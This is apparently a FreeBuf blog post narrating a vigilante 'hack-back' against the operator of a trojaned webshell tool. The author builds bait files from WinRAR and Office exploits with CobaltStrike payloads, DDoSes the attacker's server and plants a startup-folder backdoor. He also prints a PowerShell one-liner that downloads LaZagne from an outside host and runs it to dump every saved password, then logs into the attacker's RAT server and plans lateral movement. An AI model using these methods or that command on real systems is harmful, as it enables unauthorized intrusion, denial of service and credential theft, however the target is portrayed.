***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ***本文原创作者：日理万鸡，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

## 0x01 前言

**写这篇文章时，这次的渗透已经完成一周多了，当时也没有想到会要写文章出来，所以有一部截图是后来补上的，为了我的人身安全，有涉及到的敏感信息，我都会打码，请多多包涵。**

## 0x02 事情的起因

最近加了很多信息安全相关的QQ群，不得不说，在这些群里面受益匪浅，不过发现几个QQ群友，一直在推广他们的全自动渗透工具，会经常蹦出来什么全自动getshell工具箱、exp批量利用工具、电脑手机远程管理工具等等，还有很多我没听说过的工具，比如下面这些。  

![image.png](https://image.3001.net/images/20190414/1555236838_5cb307e6b7f7b.png!small)![image.png](https://image.3001.net/images/20190414/1555236846_5cb307ee8fa06.png!small)  

![image.png](https://image.3001.net/images/20190414/1555236852_5cb307f4288e9.png!small)

## 0x03 发现可疑文件

花了半天时间，下载了QQ群中大大小小好几款相关的工具分析了下，要么无法运行，各种报错，但并没有发现什么可疑的点。在准备放弃的时候，果不其然，发现一款Xise菜刀，解压需要输入密码，单就这一点我就觉得很可疑了。  

二话不说，拨掉网线，打开虚拟机，启动火绒剑，运行该可疑程序，用火绒剑监控程序进程、文件访问、动作、网络连接等情况，马上就发现这个菜刀是被加过料的菜刀，菜刀自身会创建jpg文件到C盘，并且加注册表，创建服务项，还一直反向连接一个境外IP的1640端口，走TCP流量。  

![image.png](https://image.3001.net/images/20190414/1555237265_5cb3099114807.png!small)![image.png](https://image.3001.net/images/20190414/1555237269_5cb309957276a.png!small)微步一查此IP，被人举报过，确定是老黑的远控服务器，并且能ping通，基本确定下来了，是木马远控的监听端口。  

![image.png](https://image.3001.net/images/20190414/1555237286_5cb309a62642f.png!small)![image.png](https://image.3001.net/images/20190414/1555237287_5cb309a78ee31.png!small)花了大概半天的时间，对这台服务器进行了常规的渗透，从信息搜集、全端口、服务、弱口令、绑定的域名等等常规的方式进行渗透，可能是由于目标太小，也可能是自己技术太菜、或者是自己时间太紧等等原因，这台木马远控服务器并没有拿下来，又搞了半天，还是一无所获。  

## 0x04 思路扩展  

既然是老黑的远控，那他在我的电脑里面种了木马之后，很可能会翻我电脑的各种文件，于是就将计就计吧，那我精心制作一些比较有吸引力的文件吧，放置在我的电脑桌面，让老黑都去拿。

于是我在外网搭建了CobaltStrike远控，正式向老黑发起了战争。CobaltStrike的搭建请参考：<http://suo.im/54mIL9>。

## 0x05 制作鱼饵  

为了能提高老黑电脑的钓鱼上线成功率，最终我选择制作如下几种类型的文件，放置到我的电脑桌面，顺便把我制作的过程分享给兄弟们。

### 1、制作winrar钓鱼压缩包文件

这个当时也没有截图，家里电脑的运行库正好出现问题，无法复现制作过程了。不过制作还是很简单的，同学们直接用这个脚本制作就行：<https://github.com/WyAtu/CVE>­2018­20250  

### 2、构造RDPInception后门，留一台外网VPS

GitHub上也有自动化攻击一个脚本：<https://github.com/mdsecactivebreach/RDPInception>，但我本地一直没有实验成功，于是自己写了以下三个文件。

    
    
    powershell.vbs文件放置到我的外网VPS上的："C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\powershell.vbs"
    windows.bat文件放置到我的外网VPS上的："C:\windows.bat" 
    WindowsMedia.bat文件放置到我的外网VPS上的："C:\Program Files\WindowsMedia.bat"   
    

powershell.vbs主要用于隐藏执行，不会出现黑窗口三个文件的内容如下，用过的人一看就懂了：

![image.png](https://image.3001.net/images/20190414/1555237526_5cb30a96eb2b2.png!small)准备好后，我注销了外网这台VPS服务器，因为只有注销后，被人登录才会触发我的vbs脚本。

### 3、制作Office文档木马（CVE­2017­8570）

使用了这个脚本：<https://github.com/rxwx/CVE>­2017­8570

修改了calc文件中的代码为CobaltStrike远控上线代码

![image.png](https://image.3001.net/images/20190414/1555237778_5cb30b92d7694.png!small)制作出来的文件：  

###
![image.png](https://image.3001.net/images/20190414/1555237792_5cb30ba005dc9.png!small)4、最终效果

所有的文件和压缩包里面都是有数据的，做的也不能太假了。下图是放在桌面上的的效果，这些文件都是加过料的后门（写文章时才发现，不知道为什么，用于钓鱼的电脑上应用程序图标不能正常显示了）。

![image.png](https://image.3001.net/images/20190414/1555238870_5cb30fd65974f.png!small)  

鱼饵制作完成，在钓鱼机器上运行带木马远控的菜刀，对了，先把电脑上的相关解压工具、Office，都卸载掉，这些加过料的文件就无法在我本机上打开，老黑想要查看，就必须放置到他自己的电脑上解压后才能打开。

## 0x06 DDOS攻击至宕机  

准备就绪，就等老黑来上钩了。等了两天我的CobaltStrike没有反应，可能也是比较狡猾吧，并没有我想象的那么顺利，闲来无事，晚上找了一个压力测试平台，先把老黑的木马远控服务器打宕机吧。

![image.png](https://image.3001.net/images/20190414/1555237910_5cb30c16b7b16.png!small)呵呵，结果才打了不到30秒，服务器就挂了……

##
![image.png](https://image.3001.net/images/20190414/1555237923_5cb30c23a34a0.png!small)0x07
内网电脑上钩  

在4月3号，我用于钓鱼的外网VPS被异地登录，钓鱼很可能成功了。

![image.png](https://image.3001.net/images/20190414/1555237949_5cb30c3d0bd26.png!small)

中午查看下C盘我VPS上的WindowsMedia.bat文件，文件已经不在了，看来已经成功植入到老黑的电脑上了。

等到了第二天上午9点半左右，我的CobaltStrike果真有机器上线了。因为文件是复制到目标的Start开机自启目录，需要机器重启才会引起上线，所以可能就到了第二天吧。

![image.png](https://image.3001.net/images/20190414/1555237991_5cb30c67ec179.png!small)截个图，查看了下桌面，应该是个做菠菜的团队吧，Skype聊天软件上的人还不少。

![image.png](https://image.3001.net/images/20190414/1555238958_5cb3102e1d527.png!small)

还是为内网环境：

![image.png](https://image.3001.net/images/20190414/1555238951_5cb310278d515.png!small)

好了这个先不管，查询了下Tasklist，个人机器居然没有发现杀软。

##
![image.png](https://image.3001.net/images/20190414/1555238023_5cb30c87ad927.png!small)0x08
使用LaZagne抓取电脑上各种连接密码  

发现被控的电脑开机时间并不久，大概也能判断出来，此人下班有关电脑的习惯。

![image.png](https://image.3001.net/images/20190414/1555238053_5cb30ca59f542.png!small)顺手就给他加个后门维持吧，为了不打草惊蛇，破坏我的好事，等到中年12点半他去午休睡觉，我再来偷偷作战。

![image.png](https://image.3001.net/images/20190414/1555238082_5cb30cc25a61f.png!small)到了中午13:00
点左右，果然计算机还在线。本来想用mimikatz来抓密码，但是mimikat抓的太少了，只能抓系统密码，所以我选择了LaZagne，直接用以下命令一键抓取他的电脑上所有密码（Wifi、远程桌面、系统密码、Chrome、远程桌面等等保存的密码）：

    
    
    (echo powershell "($client = new‐object System.Net.WebClient) ‐and($client.DownloadFile('http://www.huihun.ml/laZagne.exe','wmplaye.exe')) ‐and (exit)") | cmd && wmplaye.exe all  
    

![image.png](https://image.3001.net/images/20190414/1555238139_5cb30cfb4fa2d.png!small)哈哈，今天又是一大波收获，计算上的各种远程服务器的密码、Chrome网站密码、其中最重要的木马远控服务器账号密码全部搞出来了。

##
![image.png](https://image.3001.net/images/20190414/1555238152_5cb30d08283ee.png!small)![image.png](https://image.3001.net/images/20190414/1555238158_5cb30d0ecdb20.png!small)0x09
成功登上木马远控服务器

使用抓取出来的账号与密码登录木马远控服务器。老黑原来使用的是DarkComet­RAT远控，
上面被控的机器还真不少。![image.png](https://image.3001.net/images/20190414/1555238196_5cb30d34c9065.png!small)哈哈，此次收获的资料也不少，随便登录其中一些WEB域名管理系统，更加确定又是一个做菠菜的了，突然感觉就要发财了，为了人身安全考虑，其中的域名我就不贴出来了。

在其中的一个系统中，找到了他的身份证实名信息，企业营业执行、我也不知是真还是假。

##
![image.png](https://image.3001.net/images/20190414/1555238231_5cb30d5756416.png!small)0x10
横向渗透、干内网、举报一波

到这里关于反向的钓鱼就先告一段落，明天要上班工作，今晚准备通宵干他的内网，再举报一波。

## 0x11 此次的反向钓鱼流程  

##
![image.png](https://image.3001.net/images/20190414/1555238283_5cb30d8bbddc0.png!small)0x12
总结  

本次制作了三种类型的钓鱼文件，结果只有一种成功利用上钩了。并不是每次定向钓鱼都会成功，很多时候都是失败告终的，个人业余玩玩，所以此次的对抗并没有什么目标，这些都是工作之余抽出来时间在做。在刚开始的时候也没有那么顺利，在制作钓鱼文件之初，会出现许多大大小小的问题，到最后攻击过程的整理也花了不少精力，此次钓鱼成功，从开始到结束，大概花了我半个月时间左右，但收获的东西确实也不少。

所以在日常工作还有生活中，同学们还是要提高安全意识，不要运行来历不明的程序、文档、文件，下载的文件很可能就被人绑了木马病毒，并不是所有的杀软都能查杀的。

在此也奉劝那些心怀不轨的兄弟们，大家也是成年人了，人在做，天在看，邪不压正，请好自为之。

 ***本文原创作者：日理万鸡，本文属FreeBuf原创奖励计划，未经许可禁止转载**

